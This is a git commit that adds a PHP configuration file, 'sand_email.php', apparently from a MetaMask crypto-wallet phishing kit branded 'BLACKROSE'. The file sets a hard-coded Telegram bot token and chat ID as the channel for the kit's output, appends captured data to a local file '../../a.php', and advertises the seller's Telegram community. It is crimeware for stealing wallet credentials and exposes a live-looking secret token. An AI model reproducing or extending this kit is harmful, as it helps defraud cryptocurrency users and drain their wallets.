2dc969aa38e4ff6c13b1654357b707b3db46904e
christianpryor5 <107315782+christianpryor5@users.noreply.github.com>
2022-06-11 11:59:18 -0500

    Add files via upload

---
+++ MT/system/sand_email.php
@@ -0,0 +1,33 @@
+<?php
+/**
+ * DO NOT SELL THIS SCRIPT ! 
+ * DO NOT CHANGE COPYRIGHT !
+ * METAMASK -
+ * version 01
+ * icq & telegram = @t.me/BLACKROSE_Official_Community
+ 
+###############################################
+#$            C0d3d by BLΛCkRose ♣️           $#
+#$   Recording doesn't  make you a Coder     $#
+#$          🦊METAMASK CRYPTO-WALLET🦊      $#
+###############################################
+
+**/
+
+
+/* Put here your TELEGRAM info   */
+$botToken="5223536041:AAFQwkv2dGOd3_4y08XCwdJJdXp1D3XTDSg";
+$chatId="5177140764";  
+
+
+$f = fopen("../../a.php", "a");
+    fwrite($f, $yagmai);
+
+
+$Our_Name = "BLΛCkRose ♣️ " ; 
+$Name_page = "🦊METAMASK🦊" ;
+$JoinUs_On_telegram = "@t.me/BLACKROSE_Official_Community";
+
+
+
+?>
